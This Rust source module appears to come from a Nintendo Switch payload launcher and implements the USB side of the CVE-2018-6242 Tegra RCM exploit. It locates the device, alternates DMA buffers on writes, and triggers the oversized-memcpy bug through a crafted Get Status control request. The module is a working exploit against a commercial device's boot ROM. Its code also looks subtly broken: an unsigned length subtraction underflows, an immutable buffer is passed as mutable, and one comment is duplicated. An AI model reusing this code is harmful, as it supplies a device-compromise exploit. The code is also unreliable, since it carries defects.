//! USB primitives for abusing CVE-2018-6242 on Tegra-based devices.

use std::{cmp::min, time::Duration};

use rusb::*;

use super::PAYLOAD_START_ADDR;

/// Default Nintendo Switch Product ID for RCM mode.
const RCM_PID: u16 = 0x7321;
/// Default Nintendo Switch Vendor ID for RCM mode.
const RCM_VID: u16 = 0x0955;

/// Start address of the low DMA buffer in RCM mode.
const DMA_LOW_BUFFER_ADDRESS: u32 = 0x40005000;
/// Start address of the high DMA buffer in RCM mode.
const DMA_HIGH_BUFFER_ADDRESS: u32 = 0x40009000;

/// An abstraction of the Tegra X1 RCM mode.
pub struct Rcm {
    /// The underlying USB handle to the Nintendo Switch in RCM mode.
    device: DeviceHandle<GlobalContext>,
    /// A boolean indicating whether the current DMA buffer is high.
    is_dma_buffer_high: bool,
}

impl Rcm {
    /// Creates a new instance of the RCM mode abstraction.
    pub fn new(device: DeviceHandle<GlobalContext>) -> Self {
        Rcm {
            device,
            is_dma_buffer_high: false,
        }
    }

    /// Gets the address of the currently active DMA buffer.
    #[inline(always)]
    fn get_dma_address(&self) -> u32 {
        if self.is_dma_buffer_high {
            DMA_HIGH_BUFFER_ADDRESS
        } else {
            DMA_LOW_BUFFER_ADDRESS
        }
    }

    /// Reads data from RCM over USB into the given buffer.
    ///
    /// The returned result is the number of bytes read in
    /// case of `Ok(n)`, otherwise the error caused by USB.
    pub fn read(&self, buffer: &mut [u8]) -> Result<usize> {
        // Perform the read over USB.
        self.device.read_bulk(0x81, buffer, Duration::from_millis(1000))
    }

    pub fn write(&mut self, mut buffer: &[u8]) -> Result<usize> {
        let mut data_length = buffer.len();
        let mut written_bytes = 0;
        let packet_size = 0x1000;

        while data_length > 0 {
            // Determine the size of the chunk.
            let chunk_size = min(data_length, packet_size);
            data_length -= packet_size;

            // Prepare the chunk and update the reamining data.
            let chunk = &buffer[..chunk_size];
            buffer = &buffer[chunk_size..];

            // Swap the DMA buffers and perform the write over USB.
            self.swap_dma_buffers();
            match self.device.write_bulk(0x01, chunk, Duration::from_millis(1000)) {
                Ok(n) => written_bytes += n,
                Err(err) => return Err(err),
            };
        }

        Ok(written_bytes)
    }

    /// Swaps out the DMA buffers.
    ///
    /// NOTE: This method should always be called when USB writes are issued.
    #[inline(always)]
    fn swap_dma_buffers(&mut self) {
        self.is_dma_buffer_high = !self.is_dma_buffer_high;
    }

    /// Swaps out the DMA buffers.
    ///
    /// NOTE: For the CVE-2018-6242 exploit, usage of the high
    /// buffer effectively reduces the amount of writes necessary.
    pub fn switch_dma_buffer(&mut self, high: bool) {
        if self.is_dma_buffer_high != high {
            self.write(&[0x00; 0x1000]).unwrap();
            self.swap_dma_buffers();
        }
    }

    /// Reads the Device ID from RCM over USB.
    pub fn read_device_id(&self) -> Option<[u8; 0x10]> {
        let mut device_id = [0; 0x10];

        match self.read(&mut device_id) {
            Ok(bytes) => if bytes != 0x10 { return None; },
            Err(_) => return None,
        };

        Some(device_id)
    }

    /// Exploits the RCM vulnerability by triggering a largely oversized memcpy.
    ///
    /// NOTE: The returned result is the number of bytes read in case of `Ok(n)`,
    /// otherwise the error caused by USB.
    #[cfg(target_os = "macos")]
    pub fn memecpy(&self) -> Result<usize> {
        // Prepare the buffer for the control request.
        let length = PAYLOAD_START_ADDR - self.get_dma_address();
        let buffer = vec![0; length];

        // Issue a Get Status control request with an Endpoint recipient which causes the
        // which causes the size of the data to copy into the DMA buffer to be set to the
        // size of the bytes requested by us.
        self.device.read_control(0x82, 0x0, 0, 0, &mut buffer, Duration::from_millis(1000))
    }
}

/// Attempts to find a Nintendo Switch device in RCM mode and opens a handle to it.
pub fn get_rcm_device(vid: Option<u16>, pid: Option<u16>) -> Option<DeviceHandle<GlobalContext>> {
    open_device_with_vid_pid(vid.unwrap_or(RCM_VID), pid.unwrap_or(RCM_PID))
}
